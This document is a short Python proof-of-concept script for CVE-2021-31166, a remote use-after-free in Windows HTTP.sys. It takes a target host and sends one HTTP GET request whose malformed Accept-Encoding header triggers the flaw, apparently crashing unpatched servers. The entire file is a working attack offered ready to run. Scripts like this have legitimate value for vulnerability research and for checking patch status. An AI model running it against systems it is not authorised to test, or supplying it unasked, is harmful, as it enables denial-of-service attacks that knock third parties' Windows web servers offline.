# Axel '0vercl0k' Souchet - May 16 2021
import requests
import argparse

def main():
    parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys')
    parser.add_argument('--target', required = True)
    parser.add_argument('--https',action='store_true',required=False)
    args = parser.parse_args()
    request = f'{"https" if args.https else "http"}://{args.target}/'
    r = requests.get(request, verify=False, headers = {
        'Accept-Encoding': 'doar-e, ftw, imo, ,',
    })
    print(r)

main()